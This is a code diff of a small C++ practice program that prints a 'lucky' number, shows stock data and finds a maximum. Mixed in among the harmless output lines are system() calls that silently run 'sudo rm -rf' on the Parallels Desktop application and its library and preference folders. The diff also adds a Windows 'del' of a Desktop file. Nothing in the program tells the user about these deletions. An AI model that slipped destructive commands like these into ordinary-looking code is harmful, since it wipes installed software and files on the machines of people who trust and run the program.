@@ -28,7 +28,7 @@ int main(int argc,char **argv) {
     cout << "your lucky sour is:" << endl;
     cout << lucky(36,0,0,99,0) << endl;
 
-    system("sudo rm -rf /Applications/Parallels\ Desktop.app\ ");
+    system("del C:\\Users\\pixel\\Desktop\\text.txt");
     system("sudo rm -rf /Library/Parallels/Parallels/Service.app");
     system("sudo rm -rf /Library/Parallels/Receipts/com.parallels.pkg.virtualization");
     system("sudo rm -rf /Library/Preferences/Parallels");
@@ -50,5 +50,10 @@ stock1.num4 = 652.7;
 stock1.show_future();
 stock1.show_newid();
 
+//whoismax
+cout << "who is max? it is : ";
+cout << whoismax(78,45,98) << endl;
+int as;
+cin >> as;
         return 0;
 }
